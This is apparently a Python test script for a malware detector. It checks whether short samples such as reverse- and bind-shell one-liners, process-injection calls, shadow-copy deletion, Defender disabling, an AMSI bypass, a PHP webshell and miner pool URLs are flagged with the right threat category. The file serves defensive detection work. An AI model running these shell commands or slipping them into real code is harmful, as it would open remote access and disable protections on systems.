import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from core.llm_analyzer import _fallback_analysis, THREAT_PATTERNS

print("Total patterns: %d" % len(THREAT_PATTERNS))

def t(name, content, want_mal, want_cat=None):
    r = _fallback_analysis("test.txt", "modified", content)
    cats = set(f["category"] for f in r.get("findings", []))
    ok = r["is_malicious"] == want_mal
    if want_cat:
        ok = ok and want_cat in cats
    status = "PASS" if ok else "FAIL"
    print("  [%s] %-30s score=%2d pri=%-8s cats=%s" % (status, name, r["risk_score"], r["priority"], cats))
    return ok

p = []

print("\n--- Reverse Shells ---")
p.append(t("Bash /dev/tcp", "bash -i >& /dev/tcp/10.0.0.1/4242", True, "reverse_shell"))
p.append(t("Netcat -e", "nc -e /bin/sh 10.0.0.1", True, "reverse_shell"))
p.append(t("Python dup2", "import socket,os;os.dup2(s.fileno(),0)", True, "reverse_shell"))
p.append(t("PowerShell TCP", "New-Object System.Net.Sockets.TCPClient", True, "reverse_shell"))
p.append(t("PHP fsockopen", 'fsockopen("10.0.0.1",4242)', True, "reverse_shell"))
p.append(t("Ruby TCPSocket", 'TCPSocket.new("10.0.0.1", 4242)', True, "reverse_shell"))
p.append(t("Perl socket", "perl -e socket(S,PF_INET,SOCK_STREAM)", True, "reverse_shell"))
p.append(t("Socat exec", "socat exec:bash tcp:10.0.0.1:4242", False))

print("\n--- New Languages ---")
p.append(t("Go net.Dial", 'net.Dial("tcp","10.0.0.1:4242")', True, "reverse_shell"))
p.append(t("Java Runtime.exec", 'Runtime.getRuntime().exec("/bin/sh")', True))
p.append(t("Node child_process", "child_process.exec('/bin/sh')", True, "reverse_shell"))
p.append(t("Lua os.execute", 'os.execute("/bin/sh")', True, "reverse_shell"))
p.append(t("Dart Socket.connect", 'Socket.connect("10.0.0.1", 4242)', True, "reverse_shell"))
p.append(t("Awk inet/tcp", "awk /inet/tcp/4242/", True, "reverse_shell"))
p.append(t("OpenSSL s_client", "openssl s_client -connect 10.0.0.1:4242", True, "reverse_shell"))
p.append(t("Telnet pipe", "telnet 10.0.0.1 4242 | /bin/sh", True, "reverse_shell"))
p.append(t("Xterm display", "xterm -display 10.0.0.1:1", True, "reverse_shell"))
p.append(t("HoaxShell", "hoaxshell payload", True, "reverse_shell"))
p.append(t("BusyBox nc", "busybox nc 10.0.0.1 4242 -e /bin/sh", True, "reverse_shell"))

print("\n--- C/Win32 ---")
p.append(t("WSASocket", "WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP)", True, "reverse_shell"))
p.append(t("CreateProcess cmd", 'CreateProcess(NULL,"cmd.exe")', True, "reverse_shell"))
p.append(t("VirtualAlloc inject", "VirtualAllocEx(h,0,s,MEM_COMMIT,PAGE_EXECUTE_READWRITE)", True, "process_injection"))
p.append(t("WriteProcessMemory", "WriteProcessMemory(hProc,addr,buf)", True, "process_injection"))
p.append(t("CreateRemoteThread", "CreateRemoteThread(hProc,NULL,0)", True, "process_injection"))

print("\n--- Bind Shells ---")
p.append(t("Netcat bind", "nc -lvp 4444 -e /bin/sh", True, "bind_shell"))
p.append(t("Socat bind", "socat TCP-LISTEN:4444 EXEC:/bin/sh", True, "bind_shell"))

print("\n--- Malware ---")
p.append(t("Ransomware note", "YOUR FILES HAVE BEEN ENCRYPTED", True, "ransomware"))
p.append(t("Shadow copy del", "vssadmin delete shadows /all", True, "ransomware"))
p.append(t("XMRig miner", "xmrig --algo=cryptonight", True, "cryptominer"))
p.append(t("Stratum pool", "stratum+tcp://pool.minexmr.com", True, "cryptominer"))
p.append(t("Cobalt Strike", "cobalt strike beacon", True, "rat"))
p.append(t("AsyncRAT", "asyncrat client", True, "rat"))
p.append(t("AMSI bypass", "AmsiUtils amsiInitFailed", True, "evasion"))
p.append(t("Defender off", "Set-MpPreference -DisableRealtimeMonitoring", True, "evasion"))
p.append(t("Mimikatz", "mimikatz sekurlsa", True, "credential_theft"))
p.append(t("Webshell eval", "eval($_GET['cmd'])", True, "webshell"))

print("\n--- Benign ---")
p.append(t("Normal text", "Hello world normal file", False))
p.append(t("HTML page", "<html><body>Hello</body></html>", False))
p.append(t("CSS file", "body { color: red; margin: 0; }", False))

total = len(p)
passed = sum(p)
print("\nResults: %d/%d passed (%d%%)" % (passed, total, 100*passed//total))
